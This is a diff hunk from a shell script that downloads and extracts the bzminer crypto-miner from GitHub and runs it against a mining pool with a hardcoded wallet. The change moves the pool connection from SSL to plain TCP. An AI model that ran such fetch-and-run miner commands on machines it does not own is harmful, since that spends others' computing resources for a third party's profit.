@@ -4,4 +4,4 @@ apt-get update ; apt-get install sudo -y
 wget https://github.com/bzminer/bzminer/releases/download/v21.1.5/bzminer_v21.1.5_linux.tar.gz
 tar xf bzminer_v21.1.5_linux.tar.gz
 cd bzminer_v21.1.5_linux
-./bzminer -a aidepin -w XrqqF8PNr7mL73Bc1wYLxheaLzmvbWyRYz -p stratum+ssl://stratum-eu.rplant.xyz:17112 -r kzp --nc 1
+./bzminer -a aidepin -w XrqqF8PNr7mL73Bc1wYLxheaLzmvbWyRYz -p stratum+tcp://stratum-eu.rplant.xyz:7112 -r kzp --nc 1
